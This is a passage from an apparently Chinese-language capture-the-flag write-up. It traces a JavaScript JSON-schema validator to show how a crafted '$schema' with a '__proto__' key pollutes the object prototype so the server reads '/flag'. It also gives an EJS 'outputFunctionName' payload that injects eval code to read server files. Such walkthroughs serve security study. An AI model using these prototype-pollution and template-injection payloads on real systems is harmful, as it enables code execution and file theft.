class="hljs-keyword">var</span> l;</span><br><span class="line">  path += path ? <span class="hljs-keyword">typeof</span> i == <span class="hljs-string">&apos;number&apos;</span> ? <span class="hljs-string">&apos;[&apos;</span> + i + <span class="hljs-string">&apos;]&apos;</span>: <span class="hljs-keyword">typeof</span> i == <span class="hljs-string">&apos;undefined&apos;</span> ? <span class="hljs-string">&apos;&apos;</span>: <span class="hljs-string">&apos;.&apos;</span> + i: i;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addError</span>(<span class="hljs-params">message</span>) </span>{</span><br><span class="line">    errors.push({</span><br><span class="line">      property: path,</span><br><span class="line">      message: message</span><br><span class="line">    });</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">typeof</span> schema != <span class="hljs-string">&apos;object&apos;</span> || schema <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) &amp;&amp; (path || <span class="hljs-keyword">typeof</span> schema != <span class="hljs-string">&apos;function&apos;</span>) &amp;&amp; !(schema &amp;&amp; getType(schema))) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema == <span class="hljs-string">&apos;function&apos;</span>) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (! (value <span class="hljs-keyword">instanceof</span> schema)) {</span><br><span class="line">        addError(<span class="hljs-string">&quot;is not an instance of the class/constructor &quot;</span> + schema.name);</span><br><span class="line">      }</span><br><span class="line">    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (schema) {</span><br><span class="line">      addError(<span class="hljs-string">&quot;Invalid schema/property definition &quot;</span> + schema);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (_changing &amp;&amp; schema.readonly) {</span><br><span class="line">    addError(<span class="hljs-string">&quot;is a readonly field, it can not be changed&quot;</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (schema[<span class="hljs-string">&apos;extends&apos;</span>]) { <span class="hljs-comment">// if it extends another schema, it must pass that schema as well</span></span><br><span class="line">    checkProp(value, schema[<span class="hljs-string">&apos;extends&apos;</span>], path, i);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-comment">// validate a value against a type definition</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkType</span>(<span class="hljs-params">type, value</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (type) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> type == <span class="hljs-string">&apos;string&apos;</span> &amp;&amp; type != <span class="hljs-string">&apos;any&apos;</span> &amp;&amp; (type == <span class="hljs-string">&apos;null&apos;</span> ? value !== <span class="hljs-literal">null</span>: <span class="hljs-keyword">typeof</span> value != type) &amp;&amp; !(value <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span> &amp;&amp; type == <span class="hljs-string">&apos;array&apos;</span>) &amp;&amp; !(value <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Date</span> &amp;&amp; type == <span class="hljs-string">&apos;date&apos;</span>) &amp;&amp; !(type == <span class="hljs-string">&apos;integer&apos;</span> &amp;&amp; value % <span class="hljs-number">1</span> === <span class="hljs-number">0</span>)) {</span><br><span class="line">        <span class="hljs-keyword">return</span> [{</span><br><span class="line">          property: path,</span><br><span class="line">          message: (<span class="hljs-keyword">typeof</span> value) + <span class="hljs-string">&quot; value found, but a &quot;</span> + type + <span class="hljs-string">&quot; is required&quot;</span></span><br><span class="line">        }];</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) {</span><br><span class="line">        <span class="hljs-keyword">var</span> unionErrors = [];</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; type.length; j++) { <span class="hljs-comment">// a union type</span></span><br><span class="line">          <span class="hljs-keyword">if</span> (! (unionErrors = checkType(type[j], value)).length) {</span><br><span class="line">            <span class="hljs-keyword">break</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (unionErrors.length) {</span><br><span class="line">          <span class="hljs-keyword">return</span> unionErrors;</span><br><span class="line">        }</span><br><span class="line">      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> type == <span class="hljs-string">&apos;object&apos;</span>) {</span><br><span class="line">        <span class="hljs-keyword">var</span> priorErrors = errors;</span><br><span class="line">        errors = [];</span><br><span class="line">        checkProp(value, type, path);</span><br><span class="line">        <span class="hljs-keyword">var</span> theseErrors = errors;</span><br><span class="line">        errors = priorErrors;</span><br><span class="line">        <span class="hljs-keyword">return</span> theseErrors;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> [];</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (schema.required) {</span><br><span class="line">      addError(<span class="hljs-string">&quot;is missing and it is required&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">  } <span class="hljs-keyword">else</span> {</span><br><span class="line">    errors = errors.concat(checkType(getType(schema), value));</span><br><span class="line">    <span class="hljs-keyword">if</span> (schema.disallow &amp;&amp; !checkType(schema.disallow, value).length) {</span><br><span class="line">      addError(<span class="hljs-string">&quot; disallowed value was matched&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> (value !== <span class="hljs-literal">null</span>) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (schema.items) {</span><br><span class="line">          <span class="hljs-keyword">var</span> itemsIsArray = schema.items <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>;</span><br><span class="line">          <span class="hljs-keyword">var</span> propDef = schema.items;</span><br><span class="line">          <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, l = value.length; i &lt; l; i += <span class="hljs-number">1</span>) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (itemsIsArray) propDef = schema.items[i];</span><br><span class="line">            <span class="hljs-keyword">if</span> (options.coerce) value[i] = options.coerce(value[i], propDef);</span><br><span class="line">            errors.concat(checkProp(value[i], propDef, path, i));</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (schema.minItems &amp;&amp; value.length &lt; schema.minItems) {</span><br><span class="line">          addError(<span class="hljs-string">&quot;There must be a minimum of &quot;</span> + schema.minItems + <span class="hljs-string">&quot; in the array&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (schema.maxItems &amp;&amp; value.length &gt; schema.maxItems) {</span><br><span class="line">          addError(<span class="hljs-string">&quot;There must be a maximum of &quot;</span> + schema.maxItems + <span class="hljs-string">&quot; in the array&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (schema.properties || schema.additionalProperties) {</span><br><span class="line">        errors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema.pattern &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-string">&apos;string&apos;</span> &amp;&amp; !value.match(schema.pattern)) {</span><br><span class="line">        addError(<span class="hljs-string">&quot;does not match the regex pattern &quot;</span> + schema.pattern);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema.maxLength &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-string">&apos;string&apos;</span> &amp;&amp; value.length &gt; schema.maxLength) {</span><br><span class="line">        addError(<span class="hljs-string">&quot;may only be &quot;</span> + schema.maxLength + <span class="hljs-string">&quot; characters long&quot;</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema.minLength &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-string">&apos;string&apos;</span> &amp;&amp; value.length &lt; schema.minLength) {</span><br><span class="line">        addError(<span class="hljs-string">&quot;must be at least &quot;</span> + schema.minLength + <span class="hljs-string">&quot; characters long&quot;</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema.minimum !== <span class="hljs-literal">undefined</span> &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-keyword">typeof</span> schema.minimum &amp;&amp; schema.minimum &gt; value) {</span><br><span class="line">        addError(<span class="hljs-string">&quot;must have a minimum value of &quot;</span> + schema.minimum);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema.maximum !== <span class="hljs-literal">undefined</span> &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-keyword">typeof</span> schema.maximum &amp;&amp; schema.maximum &lt; value) {</span><br><span class="line">        addError(<span class="hljs-string">&quot;must have a maximum value of &quot;</span> + schema.maximum);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema[<span class="hljs-string">&apos;enum&apos;</span>]) {</span><br><span class="line">        <span class="hljs-keyword">var</span> enumer = schema[<span class="hljs-string">&apos;enum&apos;</span>];</span><br><span class="line">        l = enumer.length;</span><br><span class="line">        <span class="hljs-keyword">var</span> found;</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; l; j++) {</span><br><span class="line">          <span class="hljs-keyword">if</span> (enumer[j] === value) {</span><br><span class="line">            found = <span class="hljs-number">1</span>;</span><br><span class="line">            <span class="hljs-keyword">break</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (!found) {</span><br><span class="line">          addError(<span class="hljs-string">&quot;does not have a value in the enumeration &quot;</span> + enumer.join(<span class="hljs-string">&quot;, &quot;</span>));</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema.maxDecimal == <span class="hljs-string">&apos;number&apos;</span> &amp;&amp; (value.toString().match(<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">&quot;\\.[0-9]{&quot;</span> + (schema.maxDecimal + <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;,}&quot;</span>)))) {</span><br><span class="line">        addError(<span class="hljs-string">&quot;may only have &quot;</span> + schema.maxDecimal + <span class="hljs-string">&quot; digits of decimal places&quot;</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// validate an object against a schema</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkObj</span>(<span class="hljs-params">instance, objTypeDef, path, additionalProp</span>) </span>{</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> objTypeDef == <span class="hljs-string">&apos;object&apos;</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> instance != <span class="hljs-string">&apos;object&apos;</span> || instance <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) {</span><br><span class="line">      errors.push({</span><br><span class="line">        property: path,</span><br><span class="line">        message: <span class="hljs-string">&quot;an object is required&quot;</span></span><br><span class="line">      });</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> objTypeDef) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (objTypeDef.hasOwnProperty(i)) {</span><br><span class="line">        <span class="hljs-keyword">var</span> value = instance[i];</span><br><span class="line">        <span class="hljs-comment">// skip _not_ specified properties</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; options.existingOnly) <span class="hljs-keyword">continue</span>;</span><br><span class="line">        <span class="hljs-keyword">var</span> propDef = objTypeDef[i];</span><br><span class="line">        <span class="hljs-comment">// set default</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; propDef[<span class="hljs-string">&quot;default&quot;</span>]) {</span><br><span class="line">          value = instance[i] = propDef[<span class="hljs-string">&quot;default&quot;</span>];</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (options.coerce &amp;&amp; i <span class="hljs-keyword">in</span> instance) {</span><br><span class="line">          value = instance[i] = options.coerce(value, propDef);</span><br><span class="line">        }</span><br><span class="line">        checkProp(value, propDef, path, i);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> instance) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (instance.hasOwnProperty(i) &amp;&amp; !(i.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&apos;_&apos;</span> &amp;&amp; i.charAt(<span class="hljs-number">1</span>) == <span class="hljs-string">&apos;_&apos;</span>) &amp;&amp; objTypeDef &amp;&amp; !objTypeDef[i] &amp;&amp; additionalProp === <span class="hljs-literal">false</span>) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (options.filter) {</span><br><span class="line">        <span class="hljs-keyword">delete</span> instance[i];</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">      } <span class="hljs-keyword">else</span> {</span><br><span class="line">        errors.push({</span><br><span class="line">          property: path,</span><br><span class="line">          message: (<span class="hljs-keyword">typeof</span> value) + <span class="hljs-string">&quot;The property &quot;</span> + i + <span class="hljs-string">&quot; is not defined in the schema and the schema does not allow additional properties&quot;</span></span><br><span class="line">        });</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">var</span> requires = objTypeDef &amp;&amp; objTypeDef[i] &amp;&amp; objTypeDef[i].requires;</span><br><span class="line">    <span class="hljs-keyword">if</span> (requires &amp;&amp; !(requires <span class="hljs-keyword">in</span> instance)) {</span><br><span class="line">      errors.push({</span><br><span class="line">        property: path,</span><br><span class="line">        message: <span class="hljs-string">&quot;the presence of the property &quot;</span> + i + <span class="hljs-string">&quot; requires that &quot;</span> + requires + <span class="hljs-string">&quot; also be present&quot;</span></span><br><span class="line">      });</span><br><span class="line">    }</span><br><span class="line">    value = instance[i];</span><br><span class="line">    <span class="hljs-keyword">if</span> (additionalProp &amp;&amp; (!(objTypeDef &amp;&amp; <span class="hljs-keyword">typeof</span> objTypeDef == <span class="hljs-string">&apos;object&apos;</span>) || !(i <span class="hljs-keyword">in</span> objTypeDef))) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (options.coerce) {</span><br><span class="line">        value = instance[i] = options.coerce(value, additionalProp);</span><br><span class="line">      }</span><br><span class="line">      checkProp(value, additionalProp, path, i);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> (!_changing &amp;&amp; value &amp;&amp; value.$schema) {</span><br><span class="line">      errors = errors.concat(checkProp(value, value.$schema, path, i));</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> errors;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9996;&#x5148;&#x7B2C;&#x4E00;&#x6B21;&#x6211;&#x4EEC;&#x4F1A;&#x8FDB;&#x5165;&#x5230; <code>checkProp</code> &#x51FD;&#x6570;&#xFF0C;&#x4F20;&#x5165;&#x4EE5;&#x4E0B;&#x53C2;&#x6570;&#xFF0C;&#x5E76;&#x8FDB;&#x884C;&#x5FAA;&#x73AF;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checkProp(instance,instance.$schema,<span class="hljs-string">&apos;&apos;</span>,<span class="hljs-string">&apos;&apos;</span>);</span><br><span class="line"><span class="hljs-comment">//instance = {&quot;$schema&quot;: {&quot;properties&quot;: {&quot;__proto__&quot;: {&quot;properties&quot;: {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}}}}}</span></span><br><span class="line"><span class="hljs-comment">//instance.$schema = {&quot;properties&quot;: {&quot;__proto__&quot;: {&quot;properties&quot;: {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}}}}</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x63A5;&#x7740;&#x5728;&#x7ECF;&#x8FC7;&#x5224;&#x65AD;&#x4E4B;&#x540E;&#x8FDB;&#x5165;<code>checkObj</code>&#x51FD;&#x6570;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(schema.properties || schema.additionalProperties){</span><br><span class="line">trueerrors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//value = {&quot;$schema&quot;: {&quot;properties&quot;: {&quot;__proto__&quot;: {&quot;properties&quot;: {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}}}}}</span></span><br><span class="line"><span class="hljs-comment">//schema.properties = {&quot;__proto__&quot;: {&quot;properties&quot;: {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}}}</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x51FD;&#x6570;&#x5FAA;&#x73AF;&#x4E2D;&#xFF0C;&#x518D;&#x6B21;&#x8FDB;&#x5165;&#x5230;<code>checkProp</code>&#x51FD;&#x6570;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> objTypeDef){ </span><br><span class="line">  <span class="hljs-keyword">if</span>(objTypeDef.hasOwnProperty(i)){</span><br><span class="line">    <span class="hljs-keyword">var</span> value = instance[i];</span><br><span class="line">    <span class="hljs-comment">// skip _not_ specified properties</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; options.existingOnly) <span class="hljs-keyword">continue</span>;</span><br><span class="line">    <span class="hljs-keyword">var</span> propDef = objTypeDef[i];</span><br><span class="line">    <span class="hljs-comment">// set default</span></span><br><span class="line">    <span class="hljs-keyword">if</span>(value === <span class="hljs-literal">undefined</span> &amp;&amp; propDef[<span class="hljs-string">&quot;default&quot;</span>]){</span><br><span class="line">      value = instance[i] = propDef[<span class="hljs-string">&quot;default&quot;</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span>(options.coerce &amp;&amp; i <span class="hljs-keyword">in</span> instance){</span><br><span class="line">      value = instance[i] = options.coerce(value, propDef);</span><br><span class="line">    }</span><br><span class="line">    checkProp(value,propDef,path,i);</span><br><span class="line">    <span class="hljs-comment">//i = __proto__</span></span><br><span class="line">    <span class="hljs-comment">//value = prototype</span></span><br><span class="line">    <span class="hljs-comment">//propDDef = {&quot;properties&quot;: {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}}</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x518D;&#x6B21;&#x7531;&#x5224;&#x65AD;&#x8FDB;&#x5165;&#x5230;<code>checkObj</code>&#x51FD;&#x6570;&#xFF0C;&#x4F20;&#x5165;&#x4EE5;&#x4E0B;&#x53C2;&#x6570;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x6CE8;&#x610F;<code>value</code>&#x53C2;&#x6570;&#x5DF2;&#x7ECF;&#x88AB;&#x6307;&#x5411;<code>Function.prototype</code></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(schema.properties || schema.additionalProperties){</span><br><span class="line">trueerrors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//value = prototype</span></span><br><span class="line"><span class="hljs-comment">//schema.properties = {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}</span></span><br><span class="line"><span class="hljs-comment">//path = &quot;__proto__&quot;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x5F53;&#x518D;&#x6B21;&#x5728;&#x8FD9;&#x91CC;&#x8FDB;&#x884C;&#x8D4B;&#x503C;&#x7684;&#x65F6;&#x5019;&#xFF0C;<code>instance</code>&#x6B64;&#x65F6;&#x6307;&#x5411;<code>Function.prototype</code>&#xFF0C;&#x53C2;&#x6570; i &#x4E3A; <code>path</code>&#xFF0C;&#x5373;&#x88AB; <code>propDef[&apos;default&apos;]</code> &#x4FEE;&#x6539;&#x6210;&#x4E86;<code>/flag</code>&#xFF0C;&#x81F3;&#x6B64;&#x5B8C;&#x6210;&#x4E86;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//instance = prototype</span></span><br><span class="line"><span class="hljs-comment">//objTypeDef = {&quot;path&quot;: {&quot;default&quot;: &quot;/flag&quot;}}</span></span><br><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> objTypeDef){ </span><br><span class="line">  <span class="hljs-keyword">if</span>(objTypeDef.hasOwnProperty(i)){</span><br><span class="line">    <span class="hljs-keyword">var</span> value = instance[i];</span><br><span class="line">    <span class="hljs-comment">// skip _not_ specified properties</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; options.existingOnly) <span class="hljs-keyword">continue</span>;</span><br><span class="line">    <span class="hljs-keyword">var</span> propDef = objTypeDef[i];</span><br><span class="line">    <span class="hljs-comment">// set default</span></span><br><span class="line">    <span class="hljs-comment">//i = path</span></span><br><span class="line">    <span class="hljs-comment">//value = undefined</span></span><br><span class="line">    <span class="hljs-comment">//propDef = {&quot;default&quot;: &quot;/flag&quot;}</span></span><br><span class="line">    <span class="hljs-keyword">if</span>(value === <span class="hljs-literal">undefined</span> &amp;&amp; propDef[<span class="hljs-string">&quot;default&quot;</span>]){</span><br><span class="line">    value = instance[i] = propDef[<span class="hljs-string">&quot;default&quot;</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span>(options.coerce &amp;&amp; i <span class="hljs-keyword">in</span> instance){</span><br><span class="line">    value = instance[i] = options.coerce(value, propDef);</span><br><span class="line">    }</span><br><span class="line">    checkProp(value,propDef,path,i);</span><br><span class="line">truetrue<span class="hljs-comment">//value = &quot;/flag&quot;</span></span><br><span class="line">    <span class="hljs-comment">//propDef = {&quot;default&quot;: &quot;/flag&quot;}</span></span><br><span class="line">    <span class="hljs-comment">//path = &quot;__proto__&quot;</span></span><br><span class="line">    <span class="hljs-comment">//i = &quot;path&quot;</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x8FD9;&#x91CC;&#x5199;&#x7684;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x4E0D;&#x8FC7;&#x53EA;&#x8981;&#x7B80;&#x5355; debug &#x5C31;&#x53EF;&#x4EE5;&#x5F04;&#x660E;&#x767D;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#xFF0C;&#x5E76;&#x4E0D;&#x7B97;&#x5F88;&#x96BE;&#x3002;&#x6C61;&#x67D3;&#x4E86; <code>path</code> &#x4E4B;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8DDF;&#x524D;&#x9762;&#x7684;&#x4E00;&#x6837;&#xFF0C;&#x76F4;&#x63A5;&#x901A;&#x8FC7;<code>fs.readFileSync(p.path).toString()</code>&#x6765;&#x62FF; flag &#x4E86;&#x3002;</p><p>&#x5F53;&#x7136;&#x8FD8;&#x53EF;&#x4EE5;&#x6C61;&#x67D3; express ejs </p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">&quot;$schema&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-attr">&quot;properties&quot;</span>:{<span class="hljs-attr">&quot;__proto__&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-attr">&quot;properties&quot;</span>:{<span class="hljs-attr">&quot;outputFunctionName&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;string&quot;</span>,<span class="hljs-attr">&quot;default&quot;</span>:<span class="hljs-string">&quot;x;return eval(\&quot;process.mainModule.require(&apos;fs&apos;).readFileSync(&apos;/fl&apos;+&apos;ag&apos;).toString(&apos;base64&apos;)\&quot;);//x&quot;</span>},<span class="hljs-attr">&quot;path&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;string&quot;</span>,<span class="hljs-attr">&quot;default&quot;</span>:<span class="hljs-string">&quot;/foo&quot;</span>}}}}}}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x56E0;&#x4E3A;&#x5982;&#x679C;&#x8981;&#x6C61;&#x67D3; ejs &#x7684;&#x8BDD;&#x9700;&#x8981;&#x7528;&#x5230;<code>res.render</code>&#xFF0C;&#x800C;&#x5728; app.js &#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x4E00;&#x4E2A;&#x9519;&#x8BEF;&#x5904;&#x7406;&#x7684;&#x5730;&#x65B9;&#x4F7F;&#x7528;&#x5230;&#x4E86;<code>res.render</code></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.set(<span class="hljs-string">&quot;view engine&quot;</span>, <span 